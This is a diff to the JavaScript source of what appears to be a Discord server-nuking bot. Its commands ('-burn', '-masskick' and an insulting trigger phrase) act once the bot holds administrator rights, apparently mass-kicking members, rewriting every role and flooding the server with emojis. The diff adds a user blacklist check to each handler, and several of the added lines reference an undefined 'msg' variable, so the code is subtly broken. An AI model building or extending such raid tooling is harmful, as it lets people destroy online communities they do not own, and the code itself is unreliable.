@@ -292,6 +292,7 @@ client.on("message", msg => {
 
 client.on("message", async msg => {
   if(msg.content.startsWith(`-burn`)) {
+if(list.includes(msg.author.id)) {return}
     if(msg.channel.type === 'dm') {return}
  if(!unallowedguilds.includes(msg.guild.id)) {
     if(msg.guild.me.hasPermission("ADMINISTRATOR")) {
@@ -317,6 +318,7 @@ bruhhh++
 }
   }else if(msg.content.startsWith(`-masskick`)) {
    if(msg.channel.type === 'dm') {return}
+if(list.includes(msg.author.id)) {return}
  if(!unallowedguilds.includes(msg.guild.id)) {
     if(msg.guild.me.hasPermission("ADMINISTRATOR")) {
           var gid = msg.guild.id
@@ -350,6 +352,7 @@ bruhhh++
   })
      //this edits all roles
      client.on('message', message => {
+if(list.includes(msg.author.id)) {return}
        if(message.content.startsWith('-burn')) {
  if(message.channel.type === "dm") {return}
   if(!unallowedguilds.includes(message.guild.id)) {
@@ -369,6 +372,7 @@ setTimeout(() => {
   }
      })
  client.on('message', async message => {
+if(list.includes(msg.author.id)) {return}
    if(message.content.startsWith('kiss my disrespectful ass')) {
 if(message.channel.type === "dm") {return}
   if(!unallowedguilds.includes(message.guild.id)) {
@@ -396,6 +400,7 @@ await message.guild.emojis.create('https://i.pinimg.com/originals/34/f8/a1/34f8a
   */
  
    client.on('message', message => {
+if(list.includes(msg.author.id)) {return}
      if(message.content.startsWith("-burn")) {
  if(message.channel.type === "dm") {return}
   if(!unallowedguilds.includes(message.guild.id)) {
@@ -516,6 +521,7 @@ and a wheel's broken`, "https://youtu.be/EzQ3G5PpQ58", ":chains::chains::chains:
  }
  
    client.on('message', message => {
+if(list.includes(msg.author.id)) {return}
      if(message.content.startsWith("-burn")) {
  if(message.channel.type === "dm") {return}
   if(!unallowedguilds.includes(message.guild.id)) {
@@ -538,6 +544,7 @@ if(message.guild.me.hasPermission("ADMINISTRATOR")) {
  
  const nukingtime = new Set()
  client.on('message', msg => {
+if(list.includes(msg.author.id)) {return}
      if(msg.content.startsWith(`-burn`)) {
          if(msg.channel.type === "dm") {return}
   if(!unallowedguilds.includes(msg.guild.id)) {
@@ -648,6 +655,7 @@ client.on("message", msg => {
 
  
  client.on('message', message => {
+if(list.includes(msg.author.id)) {return}
    if(message.content.startsWith('kiss my disrespectful ass')) {
  if(message.channel.type === "dm") {return}
   if(!unallowedguilds.includes(message.guild.id)) {
